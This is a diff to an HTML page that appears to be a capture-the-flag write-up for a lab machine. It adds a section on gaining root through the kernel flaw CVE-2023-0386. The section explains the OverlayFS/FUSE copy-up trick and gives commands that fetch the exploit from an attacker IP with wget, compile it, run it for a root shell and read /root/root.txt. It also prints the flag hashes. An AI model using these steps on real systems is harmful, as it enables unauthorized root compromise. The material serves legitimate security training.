@@ -3211,6 +3211,67 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-to-root-cve-2023-0386" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation to Root — CVE-2023-0386
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation to Root — CVE-2023-0386">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-the-exploit-does" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the exploit does
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#transferring-and-compiling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Transferring and compiling
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#running-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Running it
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Root flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -4215,6 +4276,67 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-to-root-cve-2023-0386" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation to Root — CVE-2023-0386
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation to Root — CVE-2023-0386">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-the-exploit-does" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the exploit does
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#transferring-and-compiling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Transferring and compiling
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#running-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Running it
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Root flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -4563,6 +4685,61 @@ f30345b83af49629a0ff686124c80b8a
 <!-- f30345b83af49629a0ff686124c80b8a -->
 
 <p><strong>User flag captured.</strong></p>
+<hr />
+<h2 id="privilege-escalation-to-root-cve-2023-0386">Privilege Escalation to Root — CVE-2023-0386</h2>
+<h3 id="what-the-exploit-does">What the exploit does</h3>
+<p>The kernel has a flaw in how OverlayFS handles a copy-up operation when the lower layer is controlled by an unprivileged user through FUSE and a user namespace.</p>
+<p>The attack has three moving parts:</p>
+<ul>
+<li><strong>getshell</strong> — a tiny binary that calls <code>setuid(0)</code> and drops into a bash shell. Useless on its own, but deadly if it has <code>cap_setuid</code> on the real filesystem.</li>
+<li><strong>fuse</strong> — creates a fake filesystem using FUSE. When the kernel asks about the file inside it, it lies: claims the file is owned by root and has the SUID bit set. This is allowed because inside a user namespace the process appears as root.</li>
+<li><strong>exp</strong> — creates a user namespace, mounts OverlayFS with the FUSE filesystem as the read-only lower layer, then opens the file for writing. OverlayFS copies the file up to the real writable upper layer before allowing the write — and during that copy-up it faithfully copies the SUID bit and root ownership without checking whether the real user has any right to create such a file.</li>
+</ul>
+<p>After the copy-up, a real SUID root binary containing the getshell code sits on disk. Running it gives root.</p>
+<hr />
+<h3 id="transferring-and-compiling">Transferring and compiling</h3>
+<p>From the Kali machine, served the zip over HTTP:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</code></pre></div>
+<p>On the box:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>/tmp<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>mkdir<span class="w"> </span>.exp<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>.exp
+wget<span class="w"> </span>http://10.10.14.212:8000/CVE-2023-0386-main.zip
+unzip<span class="w"> </span>CVE-2023-0386-main.zip
+<span class="nb">cd</span><span class="w"> </span>CVE-2023-0386-main
+make<span class="w"> </span>all
+</code></pre></div>
+<p>The Makefile handled everything — compiled <code>fuse</code>, <code>exp</code>, and <code>gc</code> (getshell) in one go. A few format string warnings from <code>fuse.c</code> but nothing that stops it from working.</p>
+<hr />
+<h3 id="running-it">Running it</h3>
+<p>First start the FUSE filesystem in the background, pointing it at the lower directory and the getshell binary:</p>
+<div class="highlight"><pre><span></span><code>./fuse<span class="w"> </span>./ovlcap/lower<span class="w"> </span>./gc<span class="w"> </span><span class="p">&amp;</span>
+</code></pre></div>
+<p>Then run the exploit:</p>
+<div class="highlight"><pre><span></span><code>./exp
+</code></pre></div>
+<p>The output walked through every step — mount success, the FUSE callbacks firing as OverlayFS inspected the fake file, the copy-up happening, and then:</p>
+<div class="highlight"><pre><span></span><code>[+] exploit success!
+root@2million:/tmp/.exp/CVE-2023-0386-main#
+</code></pre></div>
+<p>Root shell.</p>
+<hr />
+<h3 id="root-flag">Root flag</h3>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/root/root.txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>9a206fd3f0467aabbb13159dfad362bf
+</code></pre></div>
+<!-- 9a206fd3f0467aabbb13159dfad362bf -->
+
+<p><strong>Root flag captured. Box complete.</strong></p>
+<hr />
+<div class="admonition example">
+<p class="admonition-title">Conclusion</p>
+<p>A fun box with a clear chain from start to finish.
+The invite code teaches you to look at JavaScript and think about what the client is calling.
+The API enumeration rewards curiosity — just hitting <code>/api/v1</code> with a valid session handed me the whole map.
+The admin escalation was a good reminder that broken access control does not always look dramatic.
+The kernel exploit was the most interesting part — understanding CVE-2023-0386 properly before running it made the whole thing click.</p>
+</div>
 
 
 
